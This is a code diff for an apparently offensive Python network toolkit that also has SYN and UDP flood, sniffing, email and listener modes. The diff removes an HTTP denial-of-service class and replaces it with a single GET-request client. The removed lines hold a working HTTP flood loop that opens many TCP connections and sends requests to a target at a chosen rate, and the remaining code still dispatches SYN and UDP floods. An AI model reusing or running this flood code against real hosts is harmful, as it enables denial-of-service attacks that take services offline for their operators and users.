@@ -391,11 +391,13 @@ class DoS_UDP(DoS_SYN) :
 		return
 
 
-class DoS_HTTP(DoS_SYN) :
-	def __init__(self, host, port, rate) :
-		super().__init__(host, port, rate)
+class HTTP_Request :
+	def __init__(self, host, port, end) :
+		self.host = host
+		self.port = int(port) if not isinstance(port, int) else port
+		self.end = end if end else "/"
 
-	def flood(self, module = False) :
+	def request(self, module = False) :
 		try :
 			if not module :
 				print(art)
@@ -403,32 +405,17 @@ class DoS_HTTP(DoS_SYN) :
 		except KeyboardInterrupt :
 			sys.exit(1)
 		with concurrent.futures.ThreadPoolExecutor() as task :
-			task.submit(self.__flood())
+			task.submit(self.__request())
 		return
 
-	def __flood(self) :
-		start_time = time.time()
-		self.rate += 32
-		while self.rate % 32 != 0 :
-			self.rate += 1
-		section = self.rate // 32
-		constant = section
+	def __request(self) :
 		try :
-			for i in range(1, int(self.rate) + 1) :
-				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
-					payload = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
-					flood.connect((self.host, self.port))
-					flood.send(payload.encode())
-					flood.shutdown(socket.SHUT_RDWR)
-					if i == section :
-						print(f"[+] {self.symbol}  {section} requests sent", end = "\r", flush = True)
-						section += constant
-						self.symbol += chr(9608)
-			else :
-				time.sleep(2)
-				end_time = round((time.time() - start_time), 2)
-				print("\n[+] All requests have sent")
-				print(f"[-] {end_time}s")
+			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
+				payload = f"GET {self.end} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: HI6ToolKit\r\nAccept: */*\r\n\r\n"
+				print(payload)
+				flood.connect((self.host, self.port))
+				flood.send(payload.encode())
+				print(flood.recv(4096).decode())
 		except KeyboardInterrupt :
 			pass
 		except OSError as error :
@@ -628,6 +615,7 @@ if __name__ == "__main__" :
 		parser.add_argument("-m", "--method", type = str, help = "To specify method of tool")
 		parser.add_argument("-x", "--host", type = str, help = "To specify host")
 		parser.add_argument("-p", "--port", type = int, help = "To specify port")
+		parser.add_argument("-e", "--endpoint", type = str, help = "To specify endpoint")
 		parser.add_argument("-r", "--rate", type = int, help = "To specify rate")
 		parser.add_argument("-s", "--size", type = int, help = "To specify packet size")
 		parser.add_argument("-t", "--time", type = int, help = "To specify timeout")
@@ -665,15 +653,11 @@ if __name__ == "__main__" :
 			try :
 				syn_names = ["SYN", "Syn", "syn"]
 				udp_names = ["UDP", "Udp", "udp"]
-				http_names = ["HTTP", "Http", "http"]
 				if method in syn_names :
 					flood = DoS_SYN(host, port, rate)
 					flood.flood()
 				elif method in udp_names :
 					flood = DoS_UDP(host, port, rate, size)
-					flood.flood()
-				elif method in http_names :
-					flood = DoS_HTTP(host, port, rate)
 					flood.flood()
 				else :
 					help_message()
@@ -681,6 +665,12 @@ if __name__ == "__main__" :
 				print(error)
 				help_message()
 			return
+
+		def HTTP_Request_args(host, port, endpoint) :
+			port = port if port else 80
+			host = host if host else "127.0.0.1"
+			client = HTTP_Request(host, port, endpoint)
+			client.request()
 
 		def SendEmail_args(smtp, sender, sender_password, recipient_path, subject, text_path) :
 			try :
@@ -717,6 +707,7 @@ if __name__ == "__main__" :
 		art_names = ["ART", "Art", "art"]
 		sniff_names = ["SNIFF", "Sniff", "sniff"]
 		dos_names = ["DOS", "DoS", "Dos", "dos"]
+		http_names = ["HTTP", "Http", "http"]
 		email_names = ["EMAIL", "Email", "email"]
 		listen_names = ["LISTEN", "Listen", "listen"]
 
@@ -726,6 +717,8 @@ if __name__ == "__main__" :
 			PacketSniff_args(args.host, args.method)
 		elif args.Tool in dos_names :
 			DoS_args(args.method, args.host, args.port, args.rate, args.size)
+		elif args.Tool in http_names :
+			HTTP_Request_args(args.host, args.port, args.endpoint)
 		elif args.Tool in email_names :
 			SendEmail_args(args.smtp, args.sender, args.key, args.rcptpath, args.subject, args.textpath)
 		elif args.Tool in listen_names :
